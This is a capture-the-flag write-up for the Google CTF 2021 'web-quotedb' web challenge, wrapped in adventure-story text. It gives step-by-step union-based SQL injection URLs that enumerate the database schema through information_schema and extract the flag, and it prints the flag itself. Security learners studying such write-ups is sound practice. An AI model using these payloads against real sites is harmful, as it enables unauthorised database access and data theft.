[../](../)

# Unknown - Prison Cell

> You don’t manage to disarm the guard, he is quicker than you are. He knocks you out, and when you wake up you’re inside a prison cell, but it doesn’t seem like you’re on a boat anymore, you must be inside the headquarters on the secret island! The cell is claustrophobic, with rusty iron bars and a bed of concrete.

## Challenge: web-quotedb (web)

> In this challenge, you have to find the hidden flag. Good luck!

> https://quotedb-web.2021.ctfcompetition.com/

## Solution

The website is vulnerable to SQL injection.

Probing with the following request reveals that the website outputs the second and third columns.

    https://quotedb-web.2021.ctfcompetition.com/?id=4+and+1=2+union%20select%201,2,3+from+information_schema.schemata

The following request reveals the structure of the database.

    https://quotedb-web.2021.ctfcompetition.com/?id=4+and+1=2+union%20select%201,1337,group_concat(0x7c,schema_name,0x7c)+from+information_schema.schemata

The next request enumerates all the columns of the database. It reveals a table consisting of the columns `id` and `flag`.

    https://quotedb-web.2021.ctfcompetition.com/?id=4+and+1=2+union%20select%201,1337,group_concat(0x7c,column_name,0x7C)+from+information_schema.columns

Finally, the last request shows the flag.

    https://quotedb-web.2021.ctfcompetition.com/?id=4+and+1=2+union%20select%201,1337,flag+from+flag

flag: `CTF{little_bobby_tables_we_call_him}`

> You pick up a paper clip from the floor, it’s a long shot, but it’s your only chance, pick the lock! It seems impossible… But hey, the lock is quite old, and wait... KLICK, you did it! You open up the iron bars, but the hinges squeak, and make a loud noise. You sneak out, and on the other end of the corridor is a guard. He sees you and points his blaster at you: Guard: "Hey, stay where you are, prisoner." You're considering running, but realizing that it is a lost cause, you raise your hands and step in your cell once again.